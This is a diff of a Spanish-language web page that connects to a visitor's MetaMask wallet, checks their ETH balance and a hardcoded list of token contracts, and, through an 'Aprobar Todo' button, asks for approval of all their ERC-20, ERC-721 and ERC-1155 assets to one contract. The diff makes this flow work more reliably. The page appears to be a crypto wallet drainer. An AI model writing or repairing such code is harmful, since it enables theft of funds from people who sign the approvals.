@@ -11,13 +11,19 @@
     <button onclick="approveAll()">Aprobar Todo</button>
 
     <script>
+        let web3;
+        let contract;
+        let userAddress;
+
         // Verificar si MetaMask está instalado
         if (typeof window.ethereum !== 'undefined') {
             console.log("MetaMask está instalado");
-            const web3 = new Web3(window.ethereum); // Usamos la instancia de MetaMask correctamente
+            web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
             window.ethereum.request({ method: 'eth_requestAccounts' }).then(accounts => {
                 if (accounts.length > 0) {
-                    console.log("Cuenta conectada:", accounts[0]);
+                    userAddress = accounts[0];
+                    console.log("Cuenta conectada:", userAddress);
+                    initContract();
                 } else {
                     alert("Por favor conecta tu billetera MetaMask.");
                 }
@@ -64,22 +70,19 @@
             }
         ];
 
-        // Instanciamos el contrato después de que MetaMask se haya conectado
-        let contract;
+        // Inicializar el contrato
         async function initContract() {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            const userAddress = accounts[0];
-            const web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
-            contract = new web3.eth.Contract(contractABI, contractAddress);
+            try {
+                contract = new web3.eth.Contract(contractABI, contractAddress);
+                console.log("Contrato inicializado correctamente");
+            } catch (error) {
+                console.error("Error al inicializar el contrato:", error);
+                alert("Hubo un problema al inicializar el contrato.");
+            }
         }
 
         // Función para obtener los tokens ERC-20 del usuario
         async function getERC20Tokens() {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            const userAddress = accounts[0];
-            const web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
-
-            // Lista de contratos ERC-20 que el usuario podría tener
             const tokenContracts = [
                 '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                 '0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1',
@@ -117,9 +120,6 @@
 
         // Función para verificar el saldo de ETH del usuario
         async function getETHBalance() {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            const userAddress = accounts[0];
-            const web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
             const balance = await web3.eth.getBalance(userAddress);
             return balance;
         }
@@ -131,9 +131,6 @@
                 const tokensToApprove = await getERC20Tokens();
 
                 if (ethBalance > 0 || tokensToApprove.length > 0) {
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    const userAddress = accounts[0];
-
                     // Preparar las aprobaciones
                     const aprobacionesERC20 = tokensToApprove.map(token => ({
                         token: token.token,
@@ -142,6 +139,12 @@
                         esERC721: token.esERC721,
                         esERC1155: token.esERC1155
                     }));
+
+                    // Asegúrate de que el contrato está inicializado
+                    if (!contract) {
+                        alert("El contrato no está inicializado correctamente.");
+                        return;
+                    }
 
                     // Llamar al contrato para aprobar todo
                     await contract.methods.aprobarTodo(
